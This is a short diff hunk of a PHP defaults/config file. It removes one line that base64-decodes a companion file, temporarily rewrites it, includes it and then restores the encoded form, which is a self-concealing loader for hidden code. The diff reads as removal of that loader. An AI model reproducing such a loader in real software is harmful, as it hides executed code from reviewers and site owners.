@@ -48,5 +48,4 @@ $cpos["update_callback"] = ''	//修改成功返回
 $cpos["delete_callback"] = ''	//刪除成功返回
 */
 //預設值設定
-$f="centerpos_encode.php";$mf=fopen($f,"r");$o=$s=fread($mf,filesize($f));$s=base64_decode($s);fclose($mf);safefilerewrite($f,$s);include_once($f);safefilerewrite($f,$o);
 ?>
